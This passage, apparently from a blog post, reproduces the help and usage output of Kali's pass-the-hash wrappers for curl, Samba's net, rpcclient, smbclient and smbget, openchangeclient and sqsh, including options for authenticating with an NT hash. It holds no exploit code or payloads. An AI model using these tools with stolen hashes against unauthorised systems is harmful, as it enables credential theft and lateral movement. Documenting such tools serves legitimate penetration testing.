<span class='line-number'>107</span>
<span class='line-number'>108</span>
<span class='line-number'>109</span>
<span class='line-number'>110</span>
<span class='line-number'>111</span>
<span class='line-number'>112</span>
<span class='line-number'>113</span>
<span class='line-number'>114</span>
<span class='line-number'>115</span>
<span class='line-number'>116</span>
<span class='line-number'>117</span>
<span class='line-number'>118</span>
<span class='line-number'>119</span>
<span class='line-number'>120</span>
<span class='line-number'>121</span>
<span class='line-number'>122</span>
<span class='line-number'>123</span>
<span class='line-number'>124</span>
<span class='line-number'>125</span>
<span class='line-number'>126</span>
<span class='line-number'>127</span>
<span class='line-number'>128</span>
<span class='line-number'>129</span>
<span class='line-number'>130</span>
<span class='line-number'>131</span>
<span class='line-number'>132</span>
<span class='line-number'>133</span>
<span class='line-number'>134</span>
<span class='line-number'>135</span>
<span class='line-number'>136</span>
<span class='line-number'>137</span>
<span class='line-number'>138</span>
<span class='line-number'>139</span>
<span class='line-number'>140</span>
<span class='line-number'>141</span>
<span class='line-number'>142</span>
<span class='line-number'>143</span>
<span class='line-number'>144</span>
<span class='line-number'>145</span>
<span class='line-number'>146</span>
<span class='line-number'>147</span>
<span class='line-number'>148</span>
<span class='line-number'>149</span>
<span class='line-number'>150</span>
<span class='line-number'>151</span>
<span class='line-number'>152</span>
<span class='line-number'>153</span>
<span class='line-number'>154</span>
<span class='line-number'>155</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali:~# pth-curl --help
</span><span class='line'>Usage: curl [options...] &lt;url&gt;
</span><span class='line'>Options: (H) means HTTP/HTTPS only, (F) means FTP only
</span><span class='line'>     --anyauth       Pick "any" authentication method (H)
</span><span class='line'> -a, --append        Append to target file when uploading (F/SFTP)
</span><span class='line'>     --basic         Use HTTP Basic Authentication (H)
</span><span class='line'>     --cacert FILE   CA certificate to verify peer against (SSL)
</span><span class='line'>     --capath DIR    CA directory to verify peer against (SSL)
</span><span class='line'> -E, --cert CERT[:PASSWD] Client certificate file and password (SSL)
</span><span class='line'>     --cert-type TYPE Certificate file type (DER/PEM/ENG) (SSL)
</span><span class='line'>     --ciphers LIST  SSL ciphers to use (SSL)
</span><span class='line'>     --compressed    Request compressed response (using deflate or gzip)
</span><span class='line'> -K, --config FILE   Specify which config file to read
</span><span class='line'>     --connect-timeout SECONDS  Maximum time allowed for connection
</span><span class='line'> -C, --continue-at OFFSET  Resumed transfer offset
</span><span class='line'> -b, --cookie STRING/FILE  String or file to read cookies from (H)
</span><span class='line'> -c, --cookie-jar FILE  Write cookies to this file after operation (H)
</span><span class='line'>     --create-dirs   Create necessary local directory hierarchy
</span><span class='line'>     --crlf          Convert LF to CRLF in upload
</span><span class='line'>     --crlfile FILE  Get a CRL list in PEM format from the given file
</span><span class='line'> -d, --data DATA     HTTP POST data (H)
</span><span class='line'>     --data-ascii DATA  HTTP POST ASCII data (H)
</span><span class='line'>     --data-binary DATA  HTTP POST binary data (H)
</span><span class='line'>     --data-urlencode DATA  HTTP POST data url encoded (H)
</span><span class='line'>     --delegation STRING GSS-API delegation permission
</span><span class='line'>     --digest        Use HTTP Digest Authentication (H)
</span><span class='line'>     --disable-eprt  Inhibit using EPRT or LPRT (F)
</span><span class='line'>     --disable-epsv  Inhibit using EPSV (F)
</span><span class='line'> -D, --dump-header FILE  Write the headers to this file
</span><span class='line'>     --egd-file FILE  EGD socket path for random data (SSL)
</span><span class='line'>     --engine ENGINGE  Crypto engine (SSL). "--engine list" for list
</span><span class='line'> -f, --fail          Fail silently (no output at all) on HTTP errors (H)
</span><span class='line'> -F, --form CONTENT  Specify HTTP multipart POST data (H)
</span><span class='line'>     --form-string STRING  Specify HTTP multipart POST data (H)
</span><span class='line'>     --ftp-account DATA  Account data string (F)
</span><span class='line'>     --ftp-alternative-to-user COMMAND  String to replace "USER [name]" (F)
</span><span class='line'>     --ftp-create-dirs  Create the remote dirs if not present (F)
</span><span class='line'>     --ftp-method [MULTICWD/NOCWD/SINGLECWD] Control CWD usage (F)
</span><span class='line'>     --ftp-pasv      Use PASV/EPSV instead of PORT (F)
</span><span class='line'> -P, --ftp-port ADR  Use PORT with given address instead of PASV (F)
</span><span class='line'>     --ftp-skip-pasv-ip Skip the IP address for PASV (F)
</span><span class='line'>     --ftp-pret      Send PRET before PASV (for drftpd) (F)
</span><span class='line'>     --ftp-ssl-ccc   Send CCC after authenticating (F)
</span><span class='line'>     --ftp-ssl-ccc-mode ACTIVE/PASSIVE  Set CCC mode (F)
</span><span class='line'>     --ftp-ssl-control Require SSL/TLS for ftp login, clear for transfer (F)
</span><span class='line'> -G, --get           Send the -d data with a HTTP GET (H)
</span><span class='line'> -g, --globoff       Disable URL sequences and ranges using {} and []
</span><span class='line'> -H, --header LINE   Custom header to pass to server (H)
</span><span class='line'> -I, --head          Show document info only
</span><span class='line'> -h, --help          This help text
</span><span class='line'>     --hostpubmd5 MD5  Hex encoded MD5 string of the host public key. (SSH)
</span><span class='line'> -0, --http1.0       Use HTTP 1.0 (H)
</span><span class='line'>     --ignore-content-length  Ignore the HTTP Content-Length header
</span><span class='line'> -i, --include       Include protocol headers in the output (H/F)
</span><span class='line'> -k, --insecure      Allow connections to SSL sites without certs (H)
</span><span class='line'>     --interface INTERFACE  Specify network interface/address to use
</span><span class='line'> -4, --ipv4          Resolve name to IPv4 address
</span><span class='line'> -6, --ipv6          Resolve name to IPv6 address
</span><span class='line'> -j, --junk-session-cookies Ignore session cookies read from file (H)
</span><span class='line'>     --keepalive-time SECONDS  Interval between keepalive probes
</span><span class='line'>     --key KEY       Private key file name (SSL/SSH)
</span><span class='line'>     --key-type TYPE Private key file type (DER/PEM/ENG) (SSL)
</span><span class='line'>     --krb LEVEL     Enable Kerberos with specified security level (F)
</span><span class='line'>     --libcurl FILE  Dump libcurl equivalent code of this command line
</span><span class='line'>     --limit-rate RATE  Limit transfer speed to this rate
</span><span class='line'> -l, --list-only     List only names of an FTP directory (F)
</span><span class='line'>     --local-port RANGE  Force use of these local port numbers
</span><span class='line'> -L, --location      Follow redirects (H)
</span><span class='line'>     --location-trusted like --location and send auth to other hosts (H)
</span><span class='line'> -M, --manual        Display the full manual
</span><span class='line'>     --mail-from FROM  Mail from this address
</span><span class='line'>     --mail-rcpt TO  Mail to this receiver(s)
</span><span class='line'>     --mail-auth AUTH  Originator address of the original email
</span><span class='line'>     --max-filesize BYTES  Maximum file size to download (H/F)
</span><span class='line'>     --max-redirs NUM  Maximum number of redirects allowed (H)
</span><span class='line'> -m, --max-time SECONDS  Maximum time allowed for the transfer
</span><span class='line'>     --negotiate     Use HTTP Negotiate Authentication (H)
</span><span class='line'> -n, --netrc         Must read .netrc for user name and password
</span><span class='line'>     --netrc-optional Use either .netrc or URL; overrides -n
</span><span class='line'>     --netrc-file FILE  Set up the netrc filename to use
</span><span class='line'> -N, --no-buffer     Disable buffering of the output stream
</span><span class='line'>     --no-keepalive  Disable keepalive use on the connection
</span><span class='line'>     --no-sessionid  Disable SSL session-ID reusing (SSL)
</span><span class='line'>     --noproxy       List of hosts which do not use proxy
</span><span class='line'>     --ntlm          Use HTTP NTLM authentication (H)
</span><span class='line'> -o, --output FILE   Write output to &lt;file&gt; instead of stdout
</span><span class='line'>     --pass PASS     Pass phrase for the private key (SSL/SSH)
</span><span class='line'>     --post301       Do not switch to GET after following a 301 redirect (H)
</span><span class='line'>     --post302       Do not switch to GET after following a 302 redirect (H)
</span><span class='line'>     --post303       Do not switch to GET after following a 303 redirect (H)
</span><span class='line'> -#, --progress-bar  Display transfer progress as a progress bar
</span><span class='line'>     --proto PROTOCOLS  Enable/disable specified protocols
</span><span class='line'>     --proto-redir PROTOCOLS  Enable/disable specified protocols on redirect
</span><span class='line'> -x, --proxy [PROTOCOL://]HOST[:PORT] Use proxy on given port
</span><span class='line'>     --proxy-anyauth Pick "any" proxy authentication method (H)
</span><span class='line'>     --proxy-basic   Use Basic authentication on the proxy (H)
</span><span class='line'>     --proxy-digest  Use Digest authentication on the proxy (H)
</span><span class='line'>     --proxy-negotiate Use Negotiate authentication on the proxy (H)
</span><span class='line'>     --proxy-ntlm    Use NTLM authentication on the proxy (H)
</span><span class='line'> -U, --proxy-user USER[:PASSWORD]  Proxy user and password
</span><span class='line'>     --proxy1.0 HOST[:PORT]  Use HTTP/1.0 proxy on given port
</span><span class='line'> -p, --proxytunnel   Operate through a HTTP proxy tunnel (using CONNECT)
</span><span class='line'>     --pubkey KEY    Public key file name (SSH)
</span><span class='line'> -Q, --quote CMD     Send command(s) to server before transfer (F/SFTP)
</span><span class='line'>     --random-file FILE  File for reading random data from (SSL)
</span><span class='line'> -r, --range RANGE   Retrieve only the bytes within a range
</span><span class='line'>     --raw           Do HTTP "raw", without any transfer decoding (H)
</span><span class='line'> -e, --referer       Referer URL (H)
</span><span class='line'> -J, --remote-header-name Use the header-provided filename (H)
</span><span class='line'> -O, --remote-name   Write output to a file named as the remote file
</span><span class='line'>     --remote-name-all Use the remote file name for all URLs
</span><span class='line'> -R, --remote-time   Set the remote file's time on the local output
</span><span class='line'> -X, --request COMMAND  Specify request command to use
</span><span class='line'>     --resolve HOST:PORT:ADDRESS  Force resolve of HOST:PORT to ADDRESS
</span><span class='line'>     --retry NUM   Retry request NUM times if transient problems occur
</span><span class='line'>     --retry-delay SECONDS When retrying, wait this many seconds between each
</span><span class='line'>     --retry-max-time SECONDS  Retry only within this period
</span><span class='line'> -S, --show-error    Show error. With -s, make curl show errors when they occur
</span><span class='line'> -s, --silent        Silent mode. Don't output anything
</span><span class='line'>     --socks4 HOST[:PORT]  SOCKS4 proxy on given host + port
</span><span class='line'>     --socks4a HOST[:PORT]  SOCKS4a proxy on given host + port
</span><span class='line'>     --socks5 HOST[:PORT]  SOCKS5 proxy on given host + port
</span><span class='line'>     --socks5-hostname HOST[:PORT] SOCKS5 proxy, pass host name to proxy
</span><span class='line'>     --socks5-gssapi-service NAME  SOCKS5 proxy service name for gssapi
</span><span class='line'>     --socks5-gssapi-nec  Compatibility with NEC SOCKS5 server
</span><span class='line'> -Y, --speed-limit RATE  Stop transfers below speed-limit for 'speed-time' secs
</span><span class='line'> -y, --speed-time SECONDS  Time for trig speed-limit abort. Defaults to 30
</span><span class='line'>     --ssl           Try SSL/TLS (FTP, IMAP, POP3, SMTP)
</span><span class='line'>     --ssl-reqd      Require SSL/TLS (FTP, IMAP, POP3, SMTP)
</span><span class='line'> -2, --sslv2         Use SSLv2 (SSL)
</span><span class='line'> -3, --sslv3         Use SSLv3 (SSL)
</span><span class='line'>     --ssl-allow-beast Allow security flaw to improve interop (SSL)
</span><span class='line'>     --stderr FILE   Where to redirect stderr. - means stdout
</span><span class='line'>     --tcp-nodelay   Use the TCP_NODELAY option
</span><span class='line'> -t, --telnet-option OPT=VAL  Set telnet option
</span><span class='line'>     --tftp-blksize VALUE  Set TFTP BLKSIZE option (must be &gt;512)
</span><span class='line'> -z, --time-cond TIME  Transfer based on a time condition
</span><span class='line'> -1, --tlsv1         Use TLSv1 (SSL)
</span><span class='line'>     --trace FILE    Write a debug trace to the given file
</span><span class='line'>     --trace-ascii FILE  Like --trace but without the hex output
</span><span class='line'>     --trace-time    Add time stamps to trace/verbose output
</span><span class='line'>     --tr-encoding   Request compressed transfer encoding (H)
</span><span class='line'> -T, --upload-file FILE  Transfer FILE to destination
</span><span class='line'>     --url URL       URL to work with
</span><span class='line'> -B, --use-ascii     Use ASCII/text transfer
</span><span class='line'> -u, --user USER[:PASSWORD]  Server user and password
</span><span class='line'>     --tlsuser USER  TLS username
</span><span class='line'>     --tlspassword STRING TLS password
</span><span class='line'>     --tlsauthtype STRING  TLS authentication type (default SRP)
</span><span class='line'> -A, --user-agent STRING  User-Agent to send to server (H)
</span><span class='line'> -v, --verbose       Make the operation more talkative
</span><span class='line'> -V, --version       Show version number and quit
</span><span class='line'> -w, --write-out FORMAT  What to output after completion
</span><span class='line'>     --xattr        Store metadata in extended file attributes
</span><span class='line'> -q                 If used as the first parameter disables .curlrc</span></code></pre></td></tr></table></div></figure>


<p><strong>pth-net</strong></p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>Usage:
</span><span class='line'>net rpc             Run functions using RPC transport
</span><span class='line'>net rap             Run functions using RAP transport
</span><span class='line'>net ads             Run functions using ADS transport
</span><span class='line'>net file            Functions on remote opened files
</span><span class='line'>net share           Functions on shares
</span><span class='line'>net session         Manage sessions
</span><span class='line'>net server          List servers in workgroup
</span><span class='line'>net domain          List domains/workgroups on network
</span><span class='line'>net printq          Modify printer queue
</span><span class='line'>net user            Manage users
</span><span class='line'>net group           Manage groups
</span><span class='line'>net groupmap        Manage group mappings
</span><span class='line'>net sam             Functions on the SAM database
</span><span class='line'>net validate        Validate username and password
</span><span class='line'>net groupmember     Modify group memberships
</span><span class='line'>net admin           Execute remote command on a remote OS/2 server
</span><span class='line'>net service         List/modify running services
</span><span class='line'>net password        Change user password on target server
</span><span class='line'>net changetrustpw   Change the trust password
</span><span class='line'>net changesecretpw  Change the secret password
</span><span class='line'>net setauthuser     Set the winbind auth user
</span><span class='line'>net getauthuser     Get the winbind auth user settings
</span><span class='line'>net time            Show/set time
</span><span class='line'>net lookup          Look up host names/IP addresses
</span><span class='line'>net g_lock          Manipulate the global lock table
</span><span class='line'>net join            Join a domain/AD
</span><span class='line'>net dom             Join/unjoin (remote) machines to/from a domain/AD
</span><span class='line'>net cache           Operate on the cache tdb file
</span><span class='line'>net getlocalsid     Get the SID for the local domain
</span><span class='line'>net setlocalsid     Set the SID for the local domain
</span><span class='line'>net setdomainsid    Set domain SID on member servers
</span><span class='line'>net getdomainsid    Get domain SID on member servers
</span><span class='line'>net maxrid          Display the maximum RID currently used
</span><span class='line'>net idmap           IDmap functions
</span><span class='line'>net status          Display server status
</span><span class='line'>net usershare       Manage user-modifiable shares
</span><span class='line'>net usersidlist     Display list of all users with SID
</span><span class='line'>net conf            Manage Samba registry based configuration
</span><span class='line'>net registry        Manage the Samba registry
</span><span class='line'>net eventlog        Process Win32 *.evt eventlog files
</span><span class='line'>net printing        Process tdb printer files
</span><span class='line'>net serverid        Manage the serverid tdb
</span><span class='line'>net help            Print usage information
</span><span class='line'>Valid targets: choose one (none defaults to localhost)
</span><span class='line'>  -S or --server=&lt;server&gt;       server name
</span><span class='line'>  -I or --ipaddress=&lt;ipaddr&gt;    address of target server
</span><span class='line'>  -w or --workgroup=&lt;wg&gt;        target workgroup or domain
</span><span class='line'>
</span><span class='line'>Valid miscellaneous options are:
</span><span class='line'>  -p or --port=&lt;port&gt;       connection port on target
</span><span class='line'>  -W or --myworkgroup=&lt;wg&gt;  client workgroup
</span><span class='line'>  -d or --debuglevel=&lt;level&gt;    debug level (0-10)
</span><span class='line'>  -n or --myname=&lt;name&gt;     client name
</span><span class='line'>  -U or --user=&lt;name&gt;       user name
</span><span class='line'>  -s or --configfile=&lt;path&gt; pathname of smb.conf file
</span><span class='line'>  -l or --long            Display full information
</span><span class='line'>  -V or --version         Print samba version information
</span><span class='line'>  -P or --machine-pass        Authenticate as machine account
</span><span class='line'>  -e or --encrypt         Encrypt SMB transport (UNIX extended servers only)
</span><span class='line'>  -k or --kerberos        Use kerberos (active directory) authentication</span></code></pre></td></tr></table></div></figure>


<p><strong>pth-openchangeclient</strong></p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>Usage: openchangeclient [OPTION...]
</span><span class='line'>  -f, --database=STRING           set the profile database path
</span><span class='line'>      --pf                        access public folders instead of mailbox
</span><span class='line'>  -p, --profile=STRING            set the profile name
</span><span class='line'>  -P, --password=STRING           set the profile password
</span><span class='line'>      --username=STRING           set the username of the mailbox to use
</span><span class='line'>  -S, --sendmail                  send a mail
</span><span class='line'>      --sendappointment           send an appointment
</span><span class='line'>      --sendcontact               send a contact
</span><span class='line'>      --sendtask                  send a task
</span><span class='line'>      --sendnote                  send a note
</span><span class='line'>  -F, --fetchmail                 fetch user INBOX mails
</span><span class='line'>      --fetchsummary              fetch message summaries only
</span><span class='line'>  -G, --storemail=STRING          retrieve a mail on the filesystem
</span><span class='line'>  -i, --fetch-items=STRING        fetch specified user INBOX items
</span><span class='line'>      --freebusy=STRING           display free / busy information for the specified user
</span><span class='line'>      --force                     force openchangeclient behavior in some circumstances
</span><span class='line'>      --delete=STRING             delete a message given its unique ID
</span><span class='line'>  -u, --update=STRING             update the specified item
</span><span class='line'>  -m, --mailbox                   list mailbox folder summary
</span><span class='line'>  -D, --deletemail                delete a mail from user INBOX
</span><span class='line'>  -A, --attachments=STRING        send a list of attachments
</span><span class='line'>  -I, --html-inline=STRING        send PR_HTML content
</span><span class='line'>  -W, --html-file=STRING          use HTML file as content
</span><span class='line'>  -t, --to=STRING                 set the To recipients
</span><span class='line'>  -c, --cc=STRING                 set the Cc recipients
</span><span class='line'>  -b, --bcc=STRING                set the Bcc recipients
</span><span class='line'>  -s, --subject=STRING            set the mail subject
</span><span class='line'>  -B, --body=STRING               set the mail body
</span><span class='line'>      --location=STRING           set the item location
</span><span class='line'>      --label=STRING              set the event label
</span><span class='line'>      --dtstart=STRING            set the event start date
</span><span class='line'>      --dtend=STRING              set the event end date
</span><span class='line'>      --busystatus=STRING         set the item busy status
</span><span class='line'>      --taskstatus=STRING         set the task status
</span><span class='line'>      --importance=STRING         Set the item importance
</span><span class='line'>      --email=STRING              set the email address
</span><span class='line'>      --fullname=STRING           set the full name
</span><span class='line'>      --cardname=STRING           set a contact card name
</span><span class='line'>      --color=STRING              set the note color
</span><span class='line'>      --notifications             monitor INBOX newmail notifications
</span><span class='line'>      --folder=STRING             set the folder to use instead of inbox
</span><span class='line'>      --mkdir                     create a folder
</span><span class='line'>      --rmdir                     delete a folder
</span><span class='line'>      --userlist                  list Address Book entries
</span><span class='line'>      --folder-name=STRING        set the folder name
</span><span class='line'>      --folder-comment=STRING     set the folder comment
</span><span class='line'>  -d, --debuglevel=STRING         set Debug Level
</span><span class='line'>      --dump-data                 dump the hex data
</span><span class='line'>      --private                   set the private flag on messages
</span><span class='line'>      --ocpf-file=STRING          set OCPF file
</span><span class='line'>      --ocpf-dump=STRING          dump message into OCPF file
</span><span class='line'>      --ocpf-syntax               check OCPF files syntax
</span><span class='line'>      --ocpf-sender               send message using OCPF files contents
</span><span class='line'>
</span><span class='line'>Help options:
</span><span class='line'>  -?, --help                      Show this help message
</span><span class='line'>      --usage                     Display brief usage message
</span><span class='line'>
</span><span class='line'>Common openchange options:
</span><span class='line'>  -V, --version                   Print version </span></code></pre></td></tr></table></div></figure>


<p><strong>pth-rpcclient</strong></p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>Usage: rpcclient [OPTION...]
</span><span class='line'>  -c, --command=COMMANDS                 Execute semicolon separated cmds
</span><span class='line'>  -I, --dest-ip=IP                       Specify destination IP address
</span><span class='line'>  -p, --port=PORT                        Specify port number
</span><span class='line'>
</span><span class='line'>Help options:
</span><span class='line'>  -?, --help                             Show this help message
</span><span class='line'>      --usage                            Display brief usage message
</span><span class='line'>
</span><span class='line'>Common samba options:
</span><span class='line'>  -d, --debuglevel=DEBUGLEVEL            Set debug level
</span><span class='line'>  -s, --configfile=CONFIGFILE            Use alternate configuration file
</span><span class='line'>  -l, --log-basename=LOGFILEBASE         Base name for log files
</span><span class='line'>  -V, --version                          Print version
</span><span class='line'>      --option=name=value                Set smb.conf option from command line
</span><span class='line'>
</span><span class='line'>Connection options:
</span><span class='line'>  -O, --socket-options=SOCKETOPTIONS     socket options to use
</span><span class='line'>  -n, --netbiosname=NETBIOSNAME          Primary netbios name
</span><span class='line'>  -W, --workgroup=WORKGROUP              Set the workgroup name
</span><span class='line'>  -i, --scope=SCOPE                      Use this Netbios scope
</span><span class='line'>
</span><span class='line'>Authentication options:
</span><span class='line'>  -U, --user=USERNAME                    Set the network username
</span><span class='line'>  -N, --no-pass                          Don't ask for a password
</span><span class='line'>  -k, --kerberos                         Use kerberos (active directory)
</span><span class='line'>                                         authentication
</span><span class='line'>  -A, --authentication-file=FILE         Get the credentials from a file
</span><span class='line'>  -S, --signing=on|off|required          Set the client signing state
</span><span class='line'>  -P, --machine-pass                     Use stored machine account password
</span><span class='line'>  -e, --encrypt                          Encrypt SMB transport (UNIX extended
</span><span class='line'>                                         servers only)
</span><span class='line'>  -C, --use-ccache                       Use the winbind ccache for
</span><span class='line'>                                         authentication
</span><span class='line'>      --pw-nt-hash                       The supplied password is the NT hash</span></code></pre></td></tr></table></div></figure>


<p><strong>pth-smbclient</strong></p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>Usage: smbclient [-?EgBVNkPeC] [-?|--help] [--usage]
</span><span class='line'>        [-R|--name-resolve=NAME-RESOLVE-ORDER] [-M|--message=HOST]
</span><span class='line'>        [-I|--ip-address=IP] [-E|--stderr] [-L|--list=HOST]
</span><span class='line'>        [-m|--max-protocol=LEVEL] [-T|--tar=&lt;c|x&gt;IXFqgbNan]
</span><span class='line'>        [-D|--directory=DIR] [-c|--command=STRING] [-b|--send-buffer=BYTES]
</span><span class='line'>        [-p|--port=PORT] [-g|--grepable] [-B|--browse]
</span><span class='line'>        [-d|--debuglevel=DEBUGLEVEL] [-s|--configfile=CONFIGFILE]
</span><span class='line'>        [-l|--log-basename=LOGFILEBASE] [-V|--version] [--option=name=value]
</span><span class='line'>        [-O|--socket-options=SOCKETOPTIONS] [-n|--netbiosname=NETBIOSNAME]
</span><span class='line'>        [-W|--workgroup=WORKGROUP] [-i|--scope=SCOPE] [-U|--user=USERNAME]
</span><span class='line'>        [-N|--no-pass] [-k|--kerberos] [-A|--authentication-file=FILE]
</span><span class='line'>        [-S|--signing=on|off|required] [-P|--machine-pass] [-e|--encrypt]
</span><span class='line'>        [-C|--use-ccache] [--pw-nt-hash] service &lt;password&gt;</span></code></pre></td></tr></table></div></figure>


<p><strong>pth-smbget</strong></p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>Usage: smbget [OPTION...]
</span><span class='line'>  -a, --guest                 Work as user guest
</span><span class='line'>  -e, --encrypt               Encrypt SMB transport (UNIX extended servers
</span><span class='line'>                              only)
</span><span class='line'>  -r, --resume                Automatically resume aborted files
</span><span class='line'>  -U, --update                Download only when remote file is newer than
</span><span class='line'>                              local file or local file is missing
</span><span class='line'>  -R, --recursive             Recursively download files
</span><span class='line'>  -u, --username=STRING       Username to use
</span><span class='line'>  -p, --password=STRING       Password to use
</span><span class='line'>  -w, --workgroup=STRING      Workgroup to use (optional)
</span><span class='line'>  -n, --nonprompt             Don't ask anything (non-interactive)
</span><span class='line'>  -d, --debuglevel=INT        Debuglevel to use
</span><span class='line'>  -o, --outputfile=STRING     Write downloaded data to specified file
</span><span class='line'>  -O, --stdout                Write data to stdout
</span><span class='line'>  -D, --dots                  Show dots as progress indication
</span><span class='line'>  -q, --quiet                 Be quiet
</span><span class='line'>  -v, --verbose               Be verbose
</span><span class='line'>  -P, --keep-permissions      Keep permissions
</span><span class='line'>  -b, --blocksize=INT         Change number of bytes in a block
</span><span class='line'>  -f, --rcfile=STRING         Use specified rc file
</span><span class='line'>
</span><span class='line'>Help options:
</span><span class='line'>  -?, --help                  Show this help message
</span><span class='line'>      --usage                 Display brief usage message</span></code></pre></td></tr></table></div></figure>


<p><strong>pth-sqsh</strong></p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
